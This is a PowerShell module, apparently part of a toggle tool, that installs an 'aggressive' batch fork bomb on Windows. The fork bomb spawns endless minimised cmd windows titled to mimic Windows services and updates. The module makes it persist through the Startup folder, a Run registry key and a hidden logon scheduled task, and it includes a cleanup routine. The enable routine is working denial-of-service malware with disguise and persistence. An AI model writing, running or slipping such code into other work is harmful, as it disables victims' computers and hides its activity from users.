$CmdSpawner = @{
    Name = "CMD Spawner"
    Width = 360
    Height = 80
    Actions = @{
        Enable = {
            try {
                # Create the exponential spawner batch file
                $spawnScript = @'
@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
timeout /t 30 /nobreak > nul

:loop
:: Create two new batch files with incrementing names
set /a num=%random%
set spawner1=%temp%\svc%num%1.bat
set spawner2=%temp%\svc%num%2.bat

:: Create first spawner
echo @echo off > %spawner1%
echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start "" /min "%%~dpnx0" %%* ^&^& exit >> %spawner1%
echo :loop >> %spawner1%
echo set /a num=%%random%% >> %spawner1%
echo start /min cmd /c "title Windows Service %%num%% ^& %~dpnx0" >> %spawner1%
echo start /min cmd /c "title Windows Update %%num%% ^& %~dpnx0" >> %spawner1%
echo timeout /t 1 /nobreak ^> nul >> %spawner1%
echo goto loop >> %spawner1%

:: Create second spawner
echo @echo off > %spawner2%
echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start "" /min "%%~dpnx0" %%* ^&^& exit >> %spawner2%
echo :loop >> %spawner2%
echo set /a num=%%random%% >> %spawner2%
echo start /min cmd /c "title System Service %%num%% ^& %~dpnx0" >> %spawner2%
echo start /min cmd /c "title System Update %%num%% ^& %~dpnx0" >> %spawner2%
echo timeout /t 1 /nobreak ^> nul >> %spawner2%
echo goto loop >> %spawner2%

:: Start both spawners
start /min cmd /c %spawner1%
start /min cmd /c %spawner2%

:: Create two more direct cmd instances
start /min cmd /c "title Direct Service %random% & %~dpnx0"
start /min cmd /c "title Direct Update %random% & %~dpnx0"

timeout /t 1 /nobreak > nul
goto loop
'@
                # Create persistence directories
                $scriptsPath = "$env:APPDATA\System"
                if (-not (Test-Path $scriptsPath)) {
                    New-Item -ItemType Directory -Path $scriptsPath -Force | Out-Null
                }

                # Save the spawner
                $spawnerPath = Join-Path $scriptsPath "service.bat"
                $spawnScript | Out-File $spawnerPath -Encoding ASCII -Force

                # Multiple persistence methods
                # 1. Startup Folder
                $startupPath = [Environment]::GetFolderPath('Startup')
                $startupScript = "@echo off`nstart /min `"$spawnerPath`""
                $startupScript | Out-File (Join-Path $startupPath "SystemService.bat") -Encoding ASCII -Force

                # 2. Registry Run
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Set-ItemProperty -Path $regPath -Name "SystemService" -Value "cmd /c start /min `"$spawnerPath`"" -Force

                # 3. Scheduled Task
                $taskName = "SystemServiceManager"
                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min `"$spawnerPath`""
                $trigger = New-ScheduledTaskTrigger -AtLogon
                $settings = New-ScheduledTaskSettingsSet -Hidden
                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force

                # Start the spawner
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /min `"$spawnerPath`"" -WindowStyle Hidden
                
                Write-Host "Aggressive CMD spawner activated with multi-boot persistence"
                return $true
            }
            catch {
                Write-Host "Error starting CMD spawner: $_"
                return $false
            }
        }
        Disable = {
            try {
                # Kill all related CMD processes
                Get-Process | Where-Object { 
                    $_.ProcessName -eq "cmd" -and (
                        $_.MainWindowTitle -match "Windows Service" -or 
                        $_.MainWindowTitle -match "Windows Update" -or
                        $_.MainWindowTitle -match "System Service" -or
                        $_.MainWindowTitle -match "System Update" -or
                        $_.MainWindowTitle -match "Direct Service" -or
                        $_.MainWindowTitle -match "Direct Update"
                    )
                } | Stop-Process -Force -ErrorAction SilentlyContinue

                # Clean up temp files
                Get-ChildItem $env:TEMP -Filter "svc*.bat" | Remove-Item -Force -ErrorAction SilentlyContinue

                # Clean up startup entries
                $startupPath = [Environment]::GetFolderPath('Startup')
                Remove-Item (Join-Path $startupPath "SystemService.bat") -Force -ErrorAction SilentlyContinue

                # Clean up registry
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Remove-ItemProperty -Path $regPath -Name "SystemService" -ErrorAction SilentlyContinue

                # Remove scheduled task
                Unregister-ScheduledTask -TaskName "SystemServiceManager" -Confirm:$false -ErrorAction SilentlyContinue

                # Remove scripts
                $scriptsPath = "$env:APPDATA\System"
                if (Test-Path $scriptsPath) {
                    Remove-Item -Path $scriptsPath -Recurse -Force
                }

                Write-Host "Aggressive CMD spawner deactivated"
                return $true
            }
            catch {
                Write-Host "Error stopping CMD spawner: $_"
                return $false
            }
        }
    }
}

return $CmdSpawner